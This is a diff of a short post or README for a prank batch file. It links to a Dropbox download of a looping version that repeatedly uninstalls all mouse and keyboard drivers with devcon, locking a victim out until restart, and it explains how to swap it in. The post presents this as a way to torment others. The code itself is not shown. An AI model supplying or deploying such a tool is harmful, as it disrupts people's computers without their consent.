@@ -2,7 +2,8 @@ The explanation is in the code.
 Link to other files: https://www.dropbox.com/sh/i09leu4kcifta6a/AACEFYQnlOIUsDtLLrQuemCha?dl=0 (same link as the one in the code)
 
 Side note: If you want to be a bastard and prevent them from using any mouse and keyboard at all until they restart here is the link to a looping version of the batch file: https://www.dropbox.com/s/czlyh93ga3myb8m/TheRealAnnoyance.bat?dl=0
-It continually does a devcon command to uninstall all mouse and keyboard drivers--even if they were just installed. 
+It continually does a devcon command to uninstall all mouse and keyboard drivers--even if they were just installed.
+To use it just replace the other one with this one. Mind you: if you run this on your computer you WILL NOT be able to do anything unless you restart you computer or you have a weird-ass way of controlling your computer without a mouse and keyboard. (Telekinesis?)
 
 Code:
 ```
